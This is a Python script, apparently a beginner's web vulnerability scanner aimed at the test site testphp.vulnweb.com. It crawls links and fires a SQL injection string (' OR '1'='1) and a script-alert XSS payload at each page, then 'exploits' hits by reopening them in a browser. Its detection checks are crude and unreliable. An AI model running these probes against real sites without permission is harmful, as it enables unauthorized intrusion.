import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import webbrowser

def scan_website(url):
    """
    Scan the given website for vulnerabilities by discovering URLs and checking each for vulnerabilities.
    
    Args:
    - url (str): The base URL of the website to scan.
    """
    discovered_urls = discover_urls(url)
    print(f"Discovered {len(discovered_urls)} URLs on {url}:\n")
    for i, discovered_url in enumerate(discovered_urls, start=1):
        print(f"{i}. {discovered_url}")

    for page_url in discovered_urls:
        vulnerabilities = scan_url(page_url)
        if vulnerabilities:
            print(f"\nVulnerabilities found on {page_url}:")
            for vulnerability, attack_method in vulnerabilities.items():
                print(f"\nVulnerability: {vulnerability}")
                print(f"Attack Method: {attack_method}")
                if vulnerability == "SQL injection vulnerability":
                    exploit_sql_injection(page_url)

                if vulnerability == "Cross-site scripting (XSS) vulnerability":
                    exploit_xss_vulnerability(page_url)

                if vulnerability == "Insecure server configuration":
                    print(f"Insecure server configuration detected at {page_url}.\n")

def discover_urls(url):
    """
    Discover all URLs on the given website.
    
    Args:
    - url (str): The base URL of the website to scan.
    
    Returns:
    - list: A list of discovered URLs.
    """
    discovered_urls = set()  # Use a set to avoid duplicates
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        soup = BeautifulSoup(response.text, "html.parser")

        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urljoin(url, href)
                if absolute_url.startswith(('http://', 'https://')):
                    discovered_urls.add(absolute_url)
    except requests.RequestException as e:
        print(f"Error during URL discovery: {e}")

    return list(discovered_urls)

def scan_url(url):
    """
    Scan a URL for known vulnerabilities.
    
    Args:
    - url (str): The URL to scan.
    
    Returns:
    - dict: A dictionary of vulnerabilities and their descriptions.
    """
    vulnerabilities = {}

    if is_sql_injection_vulnerable(url):
        vulnerabilities["SQL injection vulnerability"] = "Injecting SQL code into input fields"

    if is_xss_vulnerable(url):
        vulnerabilities["Cross-site scripting (XSS) vulnerability"] = "Injecting malicious scripts into input fields"

    if has_insecure_configuration(url):
        vulnerabilities["Insecure server configuration"] = "Exploiting insecure communication protocols"

    return vulnerabilities

def is_sql_injection_vulnerable(url):
    """
    Check if a URL is vulnerable to SQL injection.
    
    Args:
    - url (str): The URL to test.
    
    Returns:
    - bool: True if the URL is vulnerable, False otherwise.
    """
    try:
        payload = "' OR '1'='1"
        response = requests.get(url + "?id=" + payload)
        if re.search(r"error|warning|sql|syntax", response.text, re.IGNORECASE):
            return True
    except requests.RequestException as e:
        print(f"Error during SQL injection test: {e}")
    return False

def is_xss_vulnerable(url):
    """
    Check if a URL is vulnerable to cross-site scripting (XSS).
    
    Args:
    - url (str): The URL to test.
    
    Returns:
    - bool: True if the URL is vulnerable, False otherwise.
    """
    try:
        payload = "<script>alert('XSS')</script>"
        response = requests.get(url + "?input=" + payload)
        if payload in response.text:
            return True
    except requests.RequestException as e:
        print(f"Error during XSS test: {e}")
    return False

def has_insecure_configuration(url):
    """
    Check if a URL has insecure server configuration.
    
    Args:
    - url (str): The URL to test.
    
    Returns:
    - bool: True if the URL has insecure configuration, False otherwise.
    """
    return not url.startswith("https")

def exploit_sql_injection(url):
    """
    Test the SQL injection vulnerability by trying to exploit it and observe the results.
    
    Args:
    - url (str): The URL to exploit.
    """
    payload = "' OR '1'='1"
    vulnerable_url = f"{url}?id={payload}"
    
    print(f"Exploiting SQL injection at {vulnerable_url}.")
    
    try:
        response = requests.get(vulnerable_url)
        if re.search(r"error|warning|sql|syntax", response.text, re.IGNORECASE):
            print(f"SQL injection successful at {vulnerable_url}.\n")
            webbrowser.open(vulnerable_url)
        else:
            print("SQL injection attempt failed or did not return expected results.")
    except requests.RequestException as e:
        print(f"Error during SQL injection exploitation: {e}")

def exploit_xss_vulnerability(url):
    """
    Test the XSS vulnerability by injecting a script and observe the results.
    
    Args:
    - url (str): The URL to exploit.
    """
    payload = "<script>alert('XSS')</script>"
    xss_url = f"{url}?input={payload}"
    
    print(f"Exploiting XSS at {xss_url}.")
    
    try:
        response = requests.get(xss_url)
        if payload in response.text:
            print(f"XSS successful at {xss_url}.\n")
            webbrowser.open(xss_url)
        else:
            print("XSS attempt failed or did not return expected results.")
    except requests.RequestException as e:
        print(f"Error during XSS exploitation: {e}")

# Example usage
scan_website("http://testphp.vulnweb.com")
